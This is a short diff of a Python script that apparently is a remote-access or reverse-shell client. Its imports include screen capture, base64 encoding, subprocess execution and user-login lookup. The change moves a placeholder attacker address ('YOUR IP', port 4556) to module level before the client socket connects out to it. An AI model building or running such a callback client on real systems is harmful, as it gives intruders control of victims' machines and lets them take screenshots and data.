@@ -4,12 +4,11 @@ from PIL import ImageGrab
 from base64 import b64encode
 from subprocess import check_output
 from os import chdir, getcwd, getlogin, remove
+HOST    = "YOUR IP"                    
+PORT    = 4556
 
 if __name__ == '__main__':                         
-
-    Client  = socket(AF_INET,SOCK_STREAM)   
-    HOST    = "YOUR IP"                    
-    PORT    = 4556                          
+    Client  = socket(AF_INET,SOCK_STREAM)                           
     
     Client.connect((HOST, PORT))            
 
